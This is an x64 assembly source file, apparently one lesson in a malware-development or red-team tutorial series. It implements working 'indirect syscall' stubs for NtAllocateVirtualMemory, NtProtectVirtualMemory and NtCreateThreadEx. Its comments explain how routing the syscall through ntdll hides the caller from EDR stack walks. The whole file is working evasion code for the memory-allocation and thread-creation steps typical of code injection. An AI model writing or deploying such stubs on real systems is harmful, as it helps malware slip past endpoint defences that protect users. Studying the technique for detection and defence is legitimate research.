; 11_indirect_stub.asm
; =====================
; INDIRECT Syscall Stubs for Windows x64
;
; The crucial difference between Direct and Indirect:
;
; DIRECT:
;   mov r10, rcx
;   mov eax, SSN
;   syscall          <-- executes HERE, inside our binary
;   ret
;
; INDIRECT:
;   mov r10, rcx
;   mov eax, SSN
;   jmp [address]    <-- jumps to ntdll.dll, syscall executes THERE
;
; The JMP makes the processor continue executing in ntdll.dll.
; When the EDR does a stack walk, it sees the syscall came from ntdll
; (legitimate address) and not from our binary.
;
; The global structs (g_NtXxx) are defined in the .c file and contain:
;   Offset 0: DWORD ssn (4 bytes)
;   Offset 8: PVOID syscallInstructionAddress (8 bytes on x64)
;
; Assemble: ml64 /c 11_indirect_stub.asm

; Reference to global structs defined in C
EXTERN g_NtAllocateVirtualMemory:QWORD
EXTERN g_NtProtectVirtualMemory:QWORD
EXTERN g_NtCreateThreadEx:QWORD

.code

; ---------------------------------------------------------------
; IndirectNtAllocateVirtualMemory
;
; mov r10, rcx   -> prepare first arg (Windows syscall convention)
; mov eax, [SSN] -> load the System Service Number from the global struct
; jmp [addr]     -> jump to the "syscall" instruction address in ntdll
;
; After the JMP, the processor executes:
;   ntdll.dll: syscall
;   ntdll.dll: ret  -> returns to our caller
;
; Resulting call stack:
;   kernel
;   ntdll!NtAllocateVirtualMemory+0x12   <-- looks legitimate!
;   our_code                              <-- normal caller
; ---------------------------------------------------------------
IndirectNtAllocateVirtualMemory PROC
    mov r10, rcx                                    ; r10 = first arg
    mov eax, DWORD PTR [g_NtAllocateVirtualMemory]  ; eax = SSN (offset 0)
    jmp QWORD PTR [g_NtAllocateVirtualMemory + 8]   ; jmp to syscall in ntdll (offset 8)
IndirectNtAllocateVirtualMemory ENDP


; ---------------------------------------------------------------
; IndirectNtProtectVirtualMemory
; ---------------------------------------------------------------
IndirectNtProtectVirtualMemory PROC
    mov r10, rcx
    mov eax, DWORD PTR [g_NtProtectVirtualMemory]
    jmp QWORD PTR [g_NtProtectVirtualMemory + 8]
IndirectNtProtectVirtualMemory ENDP


; ---------------------------------------------------------------
; IndirectNtCreateThreadEx
; ---------------------------------------------------------------
IndirectNtCreateThreadEx PROC
    mov r10, rcx
    mov eax, DWORD PTR [g_NtCreateThreadEx]
    jmp QWORD PTR [g_NtCreateThreadEx + 8]
IndirectNtCreateThreadEx ENDP

end
